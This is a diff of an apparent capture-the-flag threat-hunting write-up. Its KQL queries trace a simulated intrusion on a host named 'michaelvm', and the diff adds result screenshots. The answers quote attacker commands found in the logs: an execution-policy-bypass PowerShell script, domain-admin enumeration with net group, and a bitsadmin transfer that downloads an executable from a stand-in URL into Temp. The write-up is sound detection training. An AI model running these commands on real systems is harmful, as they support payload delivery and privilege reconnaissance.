@@ -53,8 +53,9 @@ The "Lurker" scenario presented a complex and deceptive intrusion, initially cam
     | order by Timestamp asc // Find the earliest event
     | limit 1 // Get only the first result
     ```
-* ** Query Results:**
+* **Query Results:**
 <img width="767" height="161" alt="image6" src="https://github.com/user-attachments/assets/9665b24e-84b5-42e5-9e90-84db9c93d775" />
+
 
     
 * **Identified Answer:** **`Jun 16, 2025 01:38:07 AM`** - `powershell.exe` executing `"powershell.exe" -ExecutionPolicy Bypass -File "C:\Users\Mich34L_id\CorporateSim\Investments\Crypto\wallet_gen_0.ps1"`
@@ -78,6 +79,10 @@ The "Lurker" scenario presented a complex and deceptive intrusion, initially cam
     | order by Timestamp asc // Find the earliest recon attempt
     | limit 1 // Get the first result
     ```
+* **Query Results:**
+<img width="700" height="425" alt="image10" src="https://github.com/user-attachments/assets/55e7f420-fe09-4ed7-a031-a2cef6371699" />
+
+
 * **Identified Answer:** **`badf4752413cb0cbdc03fb95820ca167f0cdc63b597ccdb5ef43111180e088b0`**
     * **Why:** This SHA256 hash belongs to `cmd.exe` executing `"cmd.exe" /c "net group \" Domain Admins"` at `Jun 16, 2025 1:56:59 AM`. This is a highly targeted reconnaissance action to enumerate privileged domain groups, a critical step in an attacker's post-exploitation phase. Its occurrence shortly after initial access confirms its role.
 
@@ -86,18 +91,21 @@ The "Lurker" scenario presented a complex and deceptive intrusion, initially cam
 ### Flag 3: Sensitive Document Access
 
 * **Objective:** Reveal the document accessed/staged by the attacker.
-* **Thought Process:** The attacker's motive is financial. We looked for file access events (`FileAccessed`, `FileCreated`) on `michaelvm` involving documents (`.docx`, `.pdf`, etc.) with keywords like "board," "crypto," or "financials," especially after the reconnaissance phase.
+* **Thought Process:** The attacker's motive is financial. We looked for file access events on `michaelvm` involving documents (`.docx`, `.pdf`, etc.) with keywords like "board," "crypto," or "financials," especially after the reconnaissance phase.
 * **KQL Query Used:**
     ```kusto
     DeviceFileEvents
     | where DeviceName == "michaelvm"
     | where Timestamp > datetime(2025-06-16 01:56:59 AM) // After Flag 2
-    | where ActionType in ("FileCreated", "FileModified", "FileAccessed", "SensitiveFileRead")
+    | where ActionType in ("FileCreated", "FileModified")
     | where FileName contains "board" or FolderPath contains "board" // Use the hint
     | project Timestamp, DeviceName, ActionType, FileName, FolderPath, InitiatingProcessFileName, AccountName
     | order by Timestamp asc
-    | limit 1 // Get the first relevant document
     ```
+* **Query Results:**
+<img width="881" height="428" alt="image3" src="https://github.com/user-attachments/assets/9c6bb587-d6f5-4a23-9f9c-10adef199925" />
+
+    
 * **Identified Answer:** **`QuarterlyCryptoHoldings.docx`**
     * **Why:** This file, located in `C:\Users\Mich34L_id\Documents\BoardMinutes\`, directly relates to "crypto holdings" and "board minutes," aligning perfectly with the financial motive and the "board" hint. Its `FileCreated` event at `Jun 16, 2025 1:57:52 AM` indicates it was either created, copied, or staged by the attacker.
 
@@ -113,10 +121,14 @@ The "Lurker" scenario presented a complex and deceptive intrusion, initially cam
     | where DeviceName == "michaelvm"
     | where FileName == "QuarterlyCryptoHoldings.docx"
     | where ActionType in ("FileAccessed", "SensitiveFileRead") // Look for explicit read actions
-    | project Timestamp, DeviceName, FileName, InitiatingProcessFileName, ActionType
+    | project Timestamp, DeviceName, FileName, ActionType, FolderPath, InitiatingProcessFileName
     | order by Timestamp desc // Order by latest timestamp
-    | limit 1 // Get the very last access event
     ```
+* **Query Results:**
+<img width="1100" height="232" alt="image8" src="https://github.com/user-attachments/assets/ce8ac2c9-36e7-4d91-be42-6f37f5548445" />
+
+
+    
 * **Identified Answer:** **`2025-06-16T06:12:28.2856483Z`**
     * **Why:** This timestamp corresponds to the latest `SensitiveFileRead` event for `QuarterlyCryptoHoldings.docx`, initiated by `wordpad.exe`. This indicates the last time a user-facing application (likely controlled by the attacker) accessed the document.
 
@@ -130,13 +142,15 @@ The "Lurker" scenario presented a complex and deceptive intrusion, initially cam
     ```kusto
     DeviceProcessEvents
     | where DeviceName == "michaelvm"
-    | where Timestamp > datetime(2025-06-16 02:18:14 AM) // After HTA abuse (Flag 7)
     | where FileName =~ "bitsadmin.exe"
     | where ProcessCommandLine contains "/transfer" and (ProcessCommandLine contains "http://" or ProcessCommandLine contains "https://") // Look for transfer commands with URLs
     | project Timestamp, DeviceName, FileName, ProcessCommandLine, InitiatingProcessFileName
     | order by Timestamp asc // Find the earliest download attempt
-    | limit 1 // Get the first result
     ```
+* **Query Results:**
+<img width="1009" height="520" alt="image16" src="https://github.com/user-attachments/assets/f7b40450-6ba7-4dd0-b449-cdc4110aee08" />
+
+
 * **Identified Answer:** **`"bitsadmin.exe" /transfer job1 https://example.com/crypto_toolkit.exe C:\Users\MICH34~1\AppData\Local\Temp\market_sync.exe`**
     * **Why:** This command explicitly shows `bitsadmin.exe` downloading an executable (`crypto_toolkit.exe`) from an external URL (`example.com`) to a temporary folder, representing a stealthy payload delivery.
 
@@ -157,8 +171,12 @@ The "Lurker" scenario presented a complex and deceptive intrusion, initially cam
     | where FileName has_any ("financial", "account", "book", "ledger", "sync", "market") // Keywords from hint and previous flags
     | project Timestamp, DeviceName, ActionType, FileName, FolderPath, InitiatingProcessFileName, SHA256
     | order by Timestamp asc
-    | limit 1
     ```
+* **Query Results:**
+<img width="1240" height="152" alt="image1" src="https://github.com/user-attachments/assets/6c7670b7-9de1-4302-a390-537658b0557f" />
+
+
+    
 * **Identified Answer:** **`ledger_viewer.exe`**
     * **Why:** This executable was `FileCreated` in `C:\Users\Mich34L_id\AppData\Local\Temp\` by `powershell.exe` at `Jun 16, 2025 2:15:37 AM`. Its name `ledger_viewer.exe` directly relates to financial accounts ("Book of financial accounts" hint) and its location/initiating process are highly suspicious for a new executable.
 
